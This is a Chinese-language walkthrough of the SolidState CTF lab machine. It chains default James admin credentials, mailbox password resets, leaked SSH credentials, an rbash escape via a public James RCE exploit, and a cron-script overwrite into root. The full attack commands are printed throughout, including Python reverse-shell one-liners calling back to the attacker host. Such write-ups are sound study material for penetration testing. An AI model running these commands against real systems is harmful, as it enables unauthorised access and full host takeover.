# 信息搜集

1、端口探测

```bash
└─# nmap -A -sVC -O -p- 192.168.0.104 -oA nmap.txt
```

```bash
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 770084f578b9c7d354cf712e0d526d8b (RSA)
|   256 78b83af660190691f553921d3f48ed53 (ECDSA)
|_  256 e445e9ed074d7369435a12709dc4af76 (ED25519)
25/tcp   open  smtp        JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello 192.168.0.104 (192.168.0.103 [192.168.0.103])
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
|_http-title: Home - Solid State Security
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd (posting ok)
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
MAC Address: 00:0C:29:E5:95:0E (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2、可以看到很多邮件相关的端口，也可以看看 `JAMES Remote Admin 2.3.2` 有无相关漏洞

也可以在 [Exploit Database - Exploits for Penetration Testers, Researchers, and Ethical Hackers (exploit-db.com)](https://www.exploit-db.com/) 这里找

```bash
└─# searchsploit JAMES    
-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache James Server 2.2 - SMTP Denial of Service                                                                                | multiple/dos/27915.pl
Apache James Server 2.3.2 - Insecure User Creation Arbitrary File Write (Metasploit)                                            | linux/remote/48130.rb
Apache James Server 2.3.2 - Remote Command Execution                                                                            | linux/remote/35513.py
Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2)                                                  | linux/remote/50347.py
WheresJames Webcam Publisher Beta 2.0.0014 - Remote Buffer Overflow                                                             | windows/remote/944.c
------------------------------------------------------------------------------------------------------------
```

`35513.py` 的远程代码执行也可以看看

一看利用成功要满足两个基本条件：

（1）James Remote Administration Tool的用户名密码是默认的root/root

（2）需要有用户登录系统才会反弹shell

# 打点探测

## 4555端口

1、尝试连接

```bash
└─# nc 192.168.0.104 4555
```

或者

```bash
└─# telnet 192.168.0.104 4555 
```

用默认账号密码 root:root 连接，显示成功

2、探测敏感信息，找到 5 个邮箱用户名

```bash
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

3、把账号的密码都改一下，用**setpassword**命令，密码全都改成 `123` ，比如

```
setpassword james 123
```

4、然后依次用每个账户登录pop3，查看邮件内容，比如用`james/123`登录，并查看邮件列表

```
telnet 192.168.0.104 110                                                            
USER james
PASS 123
LIST
```

到`john`的时候，发现这个账户的邮箱中有一封邮件，用**RETR 1**命令查看邮件内容

```bash
retr 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James

.
```

邮件含义大概是 让 `mindy` 重置密码

到 `mindy`，查看其邮件

```bash
retr 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

.
```

发现一个账号密码

```
mindy:P@55W0rd1!2@
```

## SSH登录

发现登录后 shell 是 rbash，是受限制的shell

```bash
─# ssh mindy@192.168.0.104

Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
mindy@solidstate:~$ id
-rbash: id: command not found
```

## 逃逸受限制shell

### 方法一

```bash
ssh mindy@192.168.101.42 "export TERM=xterm; python -c 'import pty; pty.spawn(\"/bin/sh\")'"
```

### 方法二

利用之前得到的 `Apache James Server 2.3.2 - Remote Command Execution` 漏洞尝试

```bash
└─# nc -lvvp 443
```

```bash
└─# python 50347.py 192.168.0.104 192.168.0.103 443
```

当用户 `mindy` ssh登录时，即可得到反弹 shell

```bash
└─# nc -lvvp 443
listening on [any] 443 ...
connect to [192.168.0.103] from 192.168.0.104 [192.168.0.104] 38302

${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ id
id
uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
```

# 提权

交互 shell

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

查找具有777 权限的文件

```
find / -perm 777 -type f 2>/dev/null
```

找到 `/opt/tmp.py`

```bash
ls -al /opt
total 16
drwxr-xr-x  3 root root 4096 Aug 22  2017 .
drwxr-xr-x 22 root root 4096 Jun 18  2017 ..
drwxr-xr-x 11 root root 4096 Aug 22  2017 james-2.3.2
-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py
```

看权限是 buff 叠满了，查看文件内容，看起来像一个执行清空 /tmp 目录下文件的计划任务，当然我们也可以在 /tmp 目录下手动创建文件验证以下

```bash
$ cat tmp.py
cat tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()

```

于是就修改文件内容达到提权效果了，这里是反弹 shell，还可以复制 /bin/bash 到别的目录，再加 -p 参数提权也行

```bash
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.103",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' > /opt/tmp.py
```

监听到 root 权限的反弹 shell

```bash
└─# nc -lvvp 2333            
listening on [any] 2333 ...
connect to [192.168.0.103] from 192.168.0.104 [192.168.0.104] 42118
bash: cannot set terminal process group (1135): Inappropriate ioctl for device
bash: no job control in this shell
root@solidstate:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@solidstate:~# pwd
pwd
/root
root@solidstate:~# ls
ls
root.txt
root@solidstate:~# cat root.txt
cat root.txt
b4c9723a28899b1c45db281d99cc87c9
```

# 总结

对邮件的端口的渗透有了新的了解，talnet 去连接，查看邮件等等

对于未知的端口可以用 nc 去连接看看

再得到一定权限，二次信息搜集时，要注意权限比较高的文件（如 777），与计划任务




